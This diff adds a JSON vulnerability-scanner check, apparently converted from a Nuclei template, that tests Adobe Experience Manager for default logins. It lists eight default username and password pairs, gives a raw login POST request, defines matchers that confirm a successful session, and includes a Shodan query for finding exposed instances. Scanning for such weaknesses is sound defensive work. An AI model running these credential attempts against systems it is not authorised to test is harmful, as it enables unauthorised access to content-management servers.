@@ -1,0 +1,193 @@
+{
+  "id": "aem-default-login",
+  "name": "Adobe AEM Default Login",
+  "author": "random-robbie",
+  "severity": "HIGH",
+  "description": "Adobe AEM default login credentials were discovered.",
+  "references": [
+    "https://experienceleague.adobe.com/docs/experience-manager-64/administering/security/security-checklist.html?lang\u003den"
+  ],
+  "tags": [
+    "aem",
+    "default-login",
+    "adobe"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"Adobe Experience Manager\""
+  },
+  "variables": {
+    "aem_user": [
+      "admin",
+      "grios",
+      "replication-receiver",
+      "vgnadmin",
+      "author",
+      "anonymous",
+      "jdoe@geometrixx.info",
+      "aparker@geometrixx.info"
+    ],
+    "aem_pass": [
+      "admin",
+      "password",
+      "replication-receiver",
+      "vgnadmin",
+      "author",
+      "anonymous",
+      "jdoe",
+      "aparker"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/libs/granite/core/content/login.html\n\n_charset_\u003dutf-8\u0026j_username\u003d{{aem_user}}\u0026j_password\u003d{{aem_pass}}\u0026j_validate\u003dtrue\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "login-token",
+            "crx.default"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "aem-default-login",
+    "info": {
+      "name": "Adobe AEM Default Login",
+      "author": "random-robbie",
+      "severity": "high",
+      "description": "Adobe AEM default login credentials were discovered.",
+      "reference": [
+        "https://experienceleague.adobe.com/docs/experience-manager-64/administering/security/security-checklist.html?lang\u003den"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 8,
+        "shodan_query": "http.component:\"Adobe Experience Manager\""
+      },
+      "tags": "aem,default-login,adobe"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "aem_user": [
+            "admin",
+            "grios",
+            "replication-receiver",
+            "vgnadmin",
+            "author",
+            "anonymous",
+            "jdoe@geometrixx.info",
+            "aparker@geometrixx.info"
+          ],
+          "aem_pass": [
+            "admin",
+            "password",
+            "replication-receiver",
+            "vgnadmin",
+            "author",
+            "anonymous",
+            "jdoe",
+            "aparker"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/libs/granite/core/content/login.html\n\n_charset_\u003dutf-8\u0026j_username\u003d{{aem_user}}\u0026j_password\u003d{{aem_pass}}\u0026j_validate\u003dtrue\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "login-token",
+              "crx.default"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
